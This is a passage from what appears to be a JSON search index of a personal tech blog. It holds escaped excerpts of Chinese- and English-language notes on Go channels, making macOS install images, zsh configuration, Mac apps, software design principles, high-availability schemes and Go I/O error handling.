\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","R"],"title":"How to deal with a 50GB large csv file in r language?"},{"categories":["URL","Go","channel"],"contents":" channel 的 15 条规则和底层实现 操作规则 操作 nil 已关闭的 channel 未关闭有缓冲区的 channel 未关闭无缓冲区的 channel 关闭 panic panic 成功关闭，然后可以读取缓冲区的值，读取完之后，继续读取到的是 channel 类型的默认值 成功关闭，之后读取到的是 channel 类型的默认值 接收 阻塞 不阻塞，读取到的是 channel 类型的默认值 不阻塞，正常读取值 阻塞 发送 阻塞 panic 不阻塞，正常写入值 阻塞 编译规则 操作 channel 類型 結果 接收 只写 channel 编译错误 发送 只读 channel 编译错误 关闭 只读 channel 编译错误 ","date":"June 22, 2023","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230622-go-channel-rules/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s/AsytcOBg0XpTnPzDq7iEhQ\" target=\"_blank\" rel=\"noopener\"\u003echannel 的 15 条规则和底层实现\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"操作规则\"\u003e操作规则\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth style=\"text-align: center\"\u003e操作\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003enil\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003e已关闭的 channel\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003e未关闭有缓冲区的 channel\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003e未关闭无缓冲区的 channel\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e关闭\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003epanic\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003epanic\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e成功关闭，然后可以读取缓冲区的值，读取完之后，继续读取到的是 channel 类型的默认值\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e成功关闭，之后读取到的是 channel 类型的默认值\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e接收\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e阻塞\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e不阻塞，读取到的是 channel 类型的默认值\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e不阻塞，正常读取值\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e阻塞\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e发送\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e阻塞\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003epanic\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e不阻塞，正常写入值\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e阻塞\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"编译规则\"\u003e编译规则\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth style=\"text-align: center\"\u003e操作\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003echannel 類型\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003e結果\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e接收\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e只写 channel\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e编译错误\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e发送\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e只读 channel\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e编译错误\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e关闭\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e只读 channel\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e编译错误\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","tags":["URL","Go","channel"],"title":"channel 的 15 条规则和底层实现"},{"categories":["URL","MacOS","dmg","iso"],"contents":" 制作 macOS 系统 dmg 包及 iso 可引导镜像 dmg AppStore ==\u0026gt; search \u0026lsquo;install macos\u0026rsquo; ==\u0026gt; get installer ==\u0026gt; du -sh /Applications/Install\\ macOS\\ Mojave.app/ 磁碟工具程式 ==\u0026gt; 檔案 ==\u0026gt; 新增映像檔 ==\u0026gt; 空白映像檔 大小: installer size 格式: Mac OS 擴充格式(日誌式) 分割區: 單一分割區 - GUID 分割區配置表 映像檔格式: 可讀寫的磁碟映像檔 same as hdiutil create -o ~/Desktop/macOS\\ Mojave -size 6500m -layout SPUD -fs HFS+J sudo /Applications/Install\\ macOS\\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/macOS\\ Mojave iso hdiutil convert ~/Desktop/macOS\\ Mojave.dmg -format UDTO -o ~/Desktop/macOS\\ Mojave.iso mv ~/Desktop/macOS\\ Mojave.iso.cdr ~/Desktop/macOS\\ Mojave.iso ","date":"June 12, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230612-macos-dmg-iso/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.newlearner.site/2019/03/07/macos-dmg-iso.html\" target=\"_blank\" rel=\"noopener\"\u003e制作 macOS 系统 dmg 包及 iso 可引导镜像\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"dmg\"\u003edmg\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eAppStore ==\u0026gt; search \u0026lsquo;install macos\u0026rsquo; ==\u0026gt; get installer ==\u0026gt; \u003ccode\u003edu -sh /Applications/Install\\ macOS\\ Mojave.app/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e磁碟工具程式 ==\u0026gt; 檔案 ==\u0026gt; 新增映像檔 ==\u0026gt; 空白映像檔\n\u003col\u003e\n\u003cli\u003e大小: installer size\u003c/li\u003e\n\u003cli\u003e格式: Mac OS 擴充格式(日誌式)\u003c/li\u003e\n\u003cli\u003e分割區: 單一分割區 - GUID 分割區配置表\u003c/li\u003e\n\u003cli\u003e映像檔格式: 可讀寫的磁碟映像檔\u003c/li\u003e\n\u003cli\u003esame as \u003ccode\u003ehdiutil create -o ~/Desktop/macOS\\ Mojave -size 6500m -layout SPUD -fs HFS+J\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esudo /Applications/Install\\ macOS\\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/macOS\\ Mojave\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"iso\"\u003eiso\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003ehdiutil convert ~/Desktop/macOS\\ Mojave.dmg -format UDTO -o ~/Desktop/macOS\\ Mojave.iso\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emv ~/Desktop/macOS\\ Mojave.iso.cdr  ~/Desktop/macOS\\ Mojave.iso\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","MacOS","dmg","iso"],"title":"制作macOS系统dmg包及iso可引导镜像"},{"categories":["URL","Synology","NAS"],"contents":" Synology: Your NAS RAM Details at a Glance step1 Control Panel / Task Scheduler / Create / Scheduled Task / User-defined script\nstep2 General: In the Task field type in RAM Details. Uncheck the \u0026ldquo;Enabled\u0026rdquo; option. Select root User. Schedule: Select Run on the following date then select \u0026ldquo;Do not repeat\u0026rdquo;. Task Settings: Check \u0026ldquo;Send run details by email\u0026rdquo;, add your email then copy paste the code below in the Run command area. After that, click OK. ","date":"May 8, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230508-synology-your-nas-ram-details-at-a-glance/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mariushosting.com/synology-your-nas-ram-details-at-a-glance/\" target=\"_blank\" rel=\"noopener\"\u003eSynology: Your NAS RAM Details at a Glance\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"step1\"\u003estep1\u003c/h3\u003e\n\u003cp\u003eControl Panel / Task Scheduler / Create / Scheduled Task / User-defined script\u003c/p\u003e\n\u003ch3 id=\"step2\"\u003estep2\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eGeneral: In the Task field type in RAM Details. Uncheck the \u0026ldquo;Enabled\u0026rdquo; option. Select root User.\u003c/li\u003e\n\u003cli\u003eSchedule: Select Run on the following date then select \u0026ldquo;Do not repeat\u0026rdquo;.\u003c/li\u003e\n\u003cli\u003eTask Settings: Check \u0026ldquo;Send run details by email\u0026rdquo;, add your email then copy paste the code below in the Run command area. After that, click OK.\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Synology","NAS"],"title":"Synology: Your NAS RAM Details at a Glance"},{"categories":["URL","ZSH"],"contents":" zsh 配置文件解析及优先级 zsh 的环境变量配置文件有： .zprofile .zlogin .zshrc .zshenv .zlogout .zshrc 就是用来对 Shell 整体做个性化配置的\n.zprofile 和 .zlogin 差不多是一样的，他们都会被 login shells 设置环境变量，只是加载时间可能有一些差别。.zprofile 是基于 Bash 的 .bash_profile ，而 .zlogin 则是仿照 CSH 的 .login 遗留下来的名字 .zshrc 会设置 interactive shells 的环境变量。它会在 .zprofile 之后加载。通常可以设置 $PATH, $PROMPT, aliases, functions 等等。 .zshenv 总是会被读取，所以也可以在这里设置环境变量，$PATH 或 $EDITOR 等，但一般不怎么使用 zlogout 是在一个会话登出的时候被加载，非常适合用来清理临时的配置，比如重置终端窗口的标题 zsh 会在用户登录时(login shell)加载 ~/.zprofile\nzsh 会在开启新的终端会话时加载 ~/.zshrc\n需要注意的是首先会加载 /etc/zshenv 下的内容， 然后再加载 HOME 目录下的配置文件： .zshenv → [.zprofile if login] → [.zshrc if interactive] → [.zlogin if login] → [.zlogout].\n","date":"May 8, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230508-zprofile-zshrc/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://einverne.github.io/post/2023/01/zprofile-zshrc.html\" target=\"_blank\" rel=\"noopener\"\u003ezsh 配置文件解析及优先级\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"zsh-的环境变量配置文件有\"\u003ezsh 的环境变量配置文件有：\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e.zprofile\u003c/li\u003e\n\u003cli\u003e.zlogin\u003c/li\u003e\n\u003cli\u003e.zshrc\u003c/li\u003e\n\u003cli\u003e.zshenv\u003c/li\u003e\n\u003cli\u003e.zlogout\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e.zshrc 就是用来对 Shell 整体做个性化配置的\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e.zprofile 和 .zlogin 差不多是一样的，他们都会被 login shells 设置环境变量，只是加载时间可能有一些差别。.zprofile 是基于 Bash 的 .bash_profile ，而 .zlogin 则是仿照 CSH 的 .login 遗留下来的名字\u003c/li\u003e\n\u003cli\u003e.zshrc 会设置 interactive shells 的环境变量。它会在 .zprofile 之后加载。通常可以设置 $PATH, $PROMPT, aliases, functions 等等。\u003c/li\u003e\n\u003cli\u003e.zshenv 总是会被读取，所以也可以在这里设置环境变量，$PATH 或 $EDITOR 等，但一般不怎么使用\u003c/li\u003e\n\u003cli\u003ezlogout 是在一个会话登出的时候被加载，非常适合用来清理临时的配置，比如重置终端窗口的标题\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ezsh 会在用户登录时(login shell)加载 ~/.zprofile\u003c/p\u003e\n\u003cp\u003ezsh 会在开启新的终端会话时加载 ~/.zshrc\u003c/p\u003e\n\u003ch3 id=\"需要注意的是首先会加载-etczshenv-下的内容-然后再加载-home-目录下的配置文件\"\u003e需要注意的是首先会加载 /etc/zshenv 下的内容， 然后再加载 HOME 目录下的配置文件：\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e.zshenv → [.zprofile if login] → [.zshrc if interactive] → [.zlogin if login] → [.zlogout].\u003c/code\u003e\u003c/p\u003e","tags":["URL","ZSH"],"title":"zsh 配置文件解析及优先级"},{"categories":["URL","MacOS"],"contents":" 我的提升生產力 Mac 設定與軟體 控制個別 App 是否進入 dark mode https://nightowlapp.co/\nbrew install --cask nightowl\n用鍵盤控制外接螢幕亮度 - MonitorControl https://github.com/MonitorControl/MonitorControl\nbrew install --cask monitorcontrol\nRaycast Raycast 可以視為免費而且功能更強大的 Alfred，讓你不需要用滑鼠，靠鍵盤 Option + Space 快速啟用各種功能，內建許多付費 App 才有的功能\n快速啟動 App 快速查字典跟使用計算機 內建查找剪貼簿歷史紀錄 自帶像是 Magnet 得 window managment 功能，利用快捷鍵迅速調整視窗大小置左置右 與行事曆整合，會議時間快到可以用快捷鍵快速開啟 Google Meet 遠端會議，而且會帶入對的 email 帳戶 可以自行寫 shell nodejs applescript 綁定快捷鍵快速啟用。 豐富的 extenstion store 可以下載 https://www.raycast.com/\nbrew install --cask raycast\n減少風扇起飛 - 讓 Spotlight 排除你的專案資料夾 系統設定 \u0026gt; Spotlight \u0026gt; 搜尋隱私權\n","date":"April 20, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230420-my-mac-setting/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://jason-memo.dev/posts/my-mac-setting/\" target=\"_blank\" rel=\"noopener\"\u003e我的提升生產力 Mac 設定與軟體\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"控制個別-app-是否進入-dark-mode\"\u003e控制個別 App 是否進入 dark mode\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://nightowlapp.co/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://nightowlapp.co/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003ebrew install --cask nightowl\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"用鍵盤控制外接螢幕亮度---monitorcontrol\"\u003e用鍵盤控制外接螢幕亮度 - MonitorControl\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/MonitorControl/MonitorControl\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/MonitorControl/MonitorControl\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003ebrew install --cask monitorcontrol\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"raycast\"\u003eRaycast\u003c/h3\u003e\n\u003cp\u003eRaycast 可以視為免費而且功能更強大的 Alfred，讓你不需要用滑鼠，靠鍵盤 Option + Space 快速啟用各種功能，內建許多付費 App 才有的功能\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e快速啟動 App\u003c/li\u003e\n\u003cli\u003e快速查字典跟使用計算機\u003c/li\u003e\n\u003cli\u003e內建查找剪貼簿歷史紀錄\u003c/li\u003e\n\u003cli\u003e自帶像是 Magnet 得 window managment 功能，利用快捷鍵迅速調整視窗大小置左置右\u003c/li\u003e\n\u003cli\u003e與行事曆整合，會議時間快到可以用快捷鍵快速開啟 Google Meet 遠端會議，而且會帶入對的 email 帳戶\u003c/li\u003e\n\u003cli\u003e可以自行寫 shell nodejs applescript 綁定快捷鍵快速啟用。\u003c/li\u003e\n\u003cli\u003e豐富的 extenstion store 可以下載\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.raycast.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.raycast.com/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003ebrew install --cask raycast\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"減少風扇起飛---讓-spotlight-排除你的專案資料夾\"\u003e減少風扇起飛 - 讓 Spotlight 排除你的專案資料夾\u003c/h3\u003e\n\u003cp\u003e系統設定 \u0026gt; Spotlight \u0026gt; 搜尋隱私權\u003c/p\u003e","tags":["URL","MacOS"],"title":"我的提升生產力 Mac 設定與軟體"},{"categories":["URL","software","design","principle"],"contents":" 一些软件设计的原则 1. Don\u0026rsquo;t Repeat Yourself (DRY) 2. Keep It Simple, Stupid (KISS) 把一个事情搞复杂是一件简单的事，但要把一个复杂的事变简单，这是一件复杂的事。\n3. Program to an interface, not an implementation 喜欢组合而不是继承 依赖倒置原则 4. Command-Query Separation (CQS) - 命令-查询分离原则 查询：当一个方法返回一个值来回应一个问题的时候，它就具有查询的性质； 命令：当一个方法要改变对象的状态的时候，它就具有命令的性质； 5. You Ain\u0026rsquo;t Gonna Need It (YAGNI) 只考虑和设计必须的功能，避免过度设计。只实现目前需要的功能，在以后您需要更多功能时，可以再进行添加。\n6. Law of Demeter - 迪米特法则 最少知识原则（Principle of Least Knowledge） 不要和陌生人说话\n如果你想让你的狗跑的话，你会对狗狗说还是对四条狗腿说？ 如果你去店里买东西，你会把钱交给店员，还是会把钱包交给店员让他自己拿？\n对于对象 O 中一个方法 M ，M 应该只能够访问以下对象中的方法：\n对象 O； 与 O 直接相关的 Component Object； 由方法 M 创建或者实例化的对象； 作为方法 M 的参数的对象。 7. 面向对象的 S.O.L.I.D 原则 Single Responsibility Principle (SRP) - 职责单一原则 一个类，只做一件事，并把这件事做好，其只有一个引起它变化的原因\nUnix/Linux 是这一原则的完美体现者。各个程序都独立负责一个单一的事。 Windows 是这一原则的反面示例。几乎所有的程序都交织耦合在一起。 Open/Closed Principle (OCP) - 开闭原则 模块是可扩展的，而不可修改的。也就是说，对扩展是开放的，而对修改是封闭的。\n对扩展开放，意味着有新的需求或变化时，可以对现有代码进行扩展，以适应新的情况。 对修改封闭，意味着类一旦设计完成，就可以独立完成其工作，而不要对类进行任何修改。 Liskov substitution principle (LSP) - 里氏代换原则 \u0026ldquo;Subtypes must be substitutable for their base types\u0026rdquo;。也就是，子类必须能够替换成它们的基类。即：子类应该可以替换任何基类能够出现的地方，并且经过替换以后，代码还能正常工作。\nInterface Segregation Principle (ISP) - 接口隔离原则 接口隔离原则意思是把功能实现在接口中，而不是类中，使用多个专门的接口比使用单一的总接口要好。\nDependency Inversion Principle (DIP) - 依赖倒置原则 高层模块不应该依赖于低层模块的实现，而是依赖于高层抽象。\n墙面的开关不应该依赖于电灯的开关实现，而是应该依赖于一个抽象的开关的标准接口，这样，当我们扩展程序的时候，我们的开关同样可以控制其它不同的灯，甚至不同的电器。 浏览器并不依赖于后面的 web 服务器，其只依赖于 HTTP 协议。 8. Common Closure Principle（CCP）- 共同封闭原则 一个包中所有的类应该对同一种类型的变化关闭。一个变化影响一个包，便影响了包中所有的类。一个更简短的说法是：一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。\n9. Common Reuse Principle (CRP) - 共同重用原则 包的所有类被一起重用。如果你重用了其中的一个类，就重用全部。换个说法是，没有被一起重用的类不应该被组合在一起。\n10. Hollywood Principle - 好莱坞原则 don\u0026rsquo;t call us, we\u0026rsquo;ll call you.\n就是由容器控制程序之间的关系，而非传统实现中，由程序代码直接操控。这也就是所谓\u0026quot;控制反转\u0026quot;的概念所在：\n不创建对象，而是描述创建对象的方式。 在代码中，对象与服务没有直接联系，而是容器负责将这些联系在一起。 控制权由应用代码中转到了外部容器，控制权的转移，是所谓反转。\n11. High Cohesion \u0026amp; Low/Loose coupling - 高内聚， 低耦合 内聚：一个模块内各个元素彼此结合的紧密程度 耦合：一个软件结构内不同模块之间互连程度的度量 12. Convention over Configuration（CoC）- 惯例优于配置原则 将一些公认的配置方式和信息作为内部缺省的规则来使用。\n13. Separation of Concerns (SoC) - 关注点分离 这个原则，就是在软件开发中，通过各种手段，将问题的各个关注点分开。如果一个问题能分解为独立且较小的问题，就是相对较易解决的。\n14. Design by Contract (DbC) - 契约式设计 15. Acyclic Dependencies Principle (ADP) - 无环依赖原则 ","date":"April 18, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230418-software-design-principles/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/4535.html\" target=\"_blank\" rel=\"noopener\"\u003e一些软件设计的原则\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"1-dont-repeat-yourself-dry\"\u003e1. Don\u0026rsquo;t Repeat Yourself (DRY)\u003c/h3\u003e\n\u003ch3 id=\"2-keep-it-simple-stupid-kiss\"\u003e2. Keep It Simple, Stupid (KISS)\u003c/h3\u003e\n\u003cp\u003e把一个事情搞复杂是一件简单的事，但要把一个复杂的事变简单，这是一件复杂的事。\u003c/p\u003e\n\u003ch3 id=\"3-program-to-an-interface-not-an-implementation\"\u003e3. Program to an interface, not an implementation\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e喜欢组合而不是继承\u003c/li\u003e\n\u003cli\u003e依赖倒置原则\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"4-command-query-separation-cqs---命令-查询分离原则\"\u003e4. Command-Query Separation (CQS) - 命令-查询分离原则\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e查询：当一个方法返回一个值来回应一个问题的时候，它就具有查询的性质；\u003c/li\u003e\n\u003cli\u003e命令：当一个方法要改变对象的状态的时候，它就具有命令的性质；\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"5-you-aint-gonna-need-it-yagni\"\u003e5. You Ain\u0026rsquo;t Gonna Need It (YAGNI)\u003c/h3\u003e\n\u003cp\u003e只考虑和设计必须的功能，避免过度设计。只实现目前需要的功能，在以后您需要更多功能时，可以再进行添加。\u003c/p\u003e\n\u003ch3 id=\"6-law-of-demeter---迪米特法则\"\u003e6. Law of Demeter - 迪米特法则\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e最少知识原则（Principle of Least Knowledge）\n不要和陌生人说话\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e如果你想让你的狗跑的话，你会对狗狗说还是对四条狗腿说？\n如果你去店里买东西，你会把钱交给店员，还是会把钱包交给店员让他自己拿？\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e对于对象 O 中一个方法 M ，M 应该只能够访问以下对象中的方法：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e对象 O；\u003c/li\u003e\n\u003cli\u003e与 O 直接相关的 Component Object；\u003c/li\u003e\n\u003cli\u003e由方法 M 创建或者实例化的对象；\u003c/li\u003e\n\u003cli\u003e作为方法 M 的参数的对象。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"7-面向对象的-solid-原则\"\u003e7. 面向对象的 S.O.L.I.D 原则\u003c/h3\u003e\n\u003ch4 id=\"single-responsibility-principle-srp---职责单一原则\"\u003eSingle Responsibility Principle (SRP) - 职责单一原则\u003c/h4\u003e\n\u003cp\u003e一个类，只做一件事，并把这件事做好，其只有一个引起它变化的原因\u003c/p\u003e","tags":["URL","software","design","principle"],"title":"一些软件设计的原则"},{"categories":["URL","design","system","HA"],"contents":" 关于高可用的系统 項目 / 機制 Backups M/S MM 2PC Paxos Consistency Weak Eventual Eventual Strong Strong Transactions No Full Local Full Full Latency Low Low Low High High Throughput High High High Low Medium Data loss Lots Some Some None None Failover Down Read only Read only Read/write Read/write 这个图基本上来说是目前高可用系统中能看得到的所有的解决方案的基础了。M/S、MM 实现起来不难，但是会有很多问题，2PC 的问题就是性能不行，而 Paxos 的问题就是太复杂，实现难度太大。\n总结一下各个高可用方案的的问题：\n对于最终一致性来说，在宕机的情况下，会出现数据没有完全同步完成，会出现数据差异性。 对于强一致性来说，要么使用性能比较慢的 XA 系的两阶段提交的方案，要么使用性能比较好，但是实现比较复杂的 Paxos 协议。 ","date":"April 18, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230418-high-availability-system/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/17459.html\" target=\"_blank\" rel=\"noopener\"\u003e关于高可用的系统\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e項目 / 機制\u003c/th\u003e\n          \u003cth\u003eBackups\u003c/th\u003e\n          \u003cth\u003eM/S\u003c/th\u003e\n          \u003cth\u003eMM\u003c/th\u003e\n          \u003cth\u003e2PC\u003c/th\u003e\n          \u003cth\u003ePaxos\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eConsistency\u003c/td\u003e\n          \u003ctd\u003eWeak\u003c/td\u003e\n          \u003ctd\u003eEventual\u003c/td\u003e\n          \u003ctd\u003eEventual\u003c/td\u003e\n          \u003ctd\u003eStrong\u003c/td\u003e\n          \u003ctd\u003eStrong\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eTransactions\u003c/td\u003e\n          \u003ctd\u003eNo\u003c/td\u003e\n          \u003ctd\u003eFull\u003c/td\u003e\n          \u003ctd\u003eLocal\u003c/td\u003e\n          \u003ctd\u003eFull\u003c/td\u003e\n          \u003ctd\u003eFull\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eLatency\u003c/td\u003e\n          \u003ctd\u003eLow\u003c/td\u003e\n          \u003ctd\u003eLow\u003c/td\u003e\n          \u003ctd\u003eLow\u003c/td\u003e\n          \u003ctd\u003eHigh\u003c/td\u003e\n          \u003ctd\u003eHigh\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eThroughput\u003c/td\u003e\n          \u003ctd\u003eHigh\u003c/td\u003e\n          \u003ctd\u003eHigh\u003c/td\u003e\n          \u003ctd\u003eHigh\u003c/td\u003e\n          \u003ctd\u003eLow\u003c/td\u003e\n          \u003ctd\u003eMedium\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eData loss\u003c/td\u003e\n          \u003ctd\u003eLots\u003c/td\u003e\n          \u003ctd\u003eSome\u003c/td\u003e\n          \u003ctd\u003eSome\u003c/td\u003e\n          \u003ctd\u003eNone\u003c/td\u003e\n          \u003ctd\u003eNone\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eFailover\u003c/td\u003e\n          \u003ctd\u003eDown\u003c/td\u003e\n          \u003ctd\u003eRead only\u003c/td\u003e\n          \u003ctd\u003eRead only\u003c/td\u003e\n          \u003ctd\u003eRead/write\u003c/td\u003e\n          \u003ctd\u003eRead/write\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e这个图基本上来说是目前高可用系统中能看得到的所有的解决方案的基础了。M/S、MM 实现起来不难，但是会有很多问题，2PC 的问题就是性能不行，而 Paxos 的问题就是太复杂，实现难度太大。\u003c/p\u003e\n\u003cp\u003e总结一下各个高可用方案的的问题：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e对于最终一致性来说，在宕机的情况下，会出现数据没有完全同步完成，会出现数据差异性。\u003c/li\u003e\n\u003cli\u003e对于强一致性来说，要么使用性能比较慢的 XA 系的两阶段提交的方案，要么使用性能比较好，但是实现比较复杂的 Paxos 协议。\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","design","system","HA"],"title":"关于高可用的系统"},{"categories":["URL","Network","MTU","MSS","Linux"],"contents":" 有关 MTU 和 MSS 的一切 ","date":"April 12, 2023","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230412-all-about-mtu-and-mss/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.kawabangga.com/posts/4983\" target=\"_blank\" rel=\"noopener\"\u003e有关 MTU 和 MSS 的一切\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Network","MTU","MSS","Linux"],"title":"有关 MTU 和 MSS 的一切"},{"categories":["URL","Go"],"contents":" 使用 Go 语言解析二进制数据踩坑总结 for { buf := make([]byte, bufSize) n, err := r.Read(buf) if err == io.EOF { return } else if err != nil { aerr.Store(err) return } ch \u0026lt;- buf[:n] } 当 err 的值为 io.EOF 时直接返回了。这是最可能出问题的地方。仔细阅读函数文档发现：\nCallers should always process the n \u0026gt; 0 bytes returned before considering the error err. Doing so correctly handles I/O errors that happen after reading some bytes and also both of the allowed EOF behaviors.\n所以程序必须先处理 n \u0026gt; 0 的情况，然后再处理 err != nil 